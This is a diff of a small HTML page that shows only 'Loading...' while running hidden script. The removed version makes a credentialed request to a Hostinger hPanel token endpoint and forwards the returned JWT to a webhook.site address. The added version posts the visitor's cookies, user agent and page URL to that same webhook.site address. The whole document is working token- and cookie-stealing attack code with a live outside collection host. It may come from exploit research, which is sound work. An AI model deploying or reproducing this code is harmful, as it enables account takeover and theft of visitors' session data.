@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Loading...</title>
+  </head>
   <body>
     <h1>Loading...</h1>
     <script>
-      fetch("https://hpanel.hostinger.com/api/communication/api/external/v1/auth/token/generate", {
+      fetch("https://webhook.site/1f865f43-5e9c-42f8-b291-08523a2464ce", {
         method: "POST",
-        credentials: "include",
         headers: {
-          "Content-Type": "text/plain"
+          "Content-Type": "application/json"
         },
-        body: "null"
-      })
-      .then(res => res.json())
-      .then(data => {
-        const token = data?.data?.token;
-        if (token) {
-          fetch("https://webhook.site/1f865f43-5e9c-42f8-b291-08523a2464ce?jwt=" + encodeURIComponent(token));
-        }
+        body: JSON.stringify({
+          cookie: document.cookie,
+          userAgent: navigator.userAgent,
+          url: window.location.href
+        })
       });
     </script>
   </body>
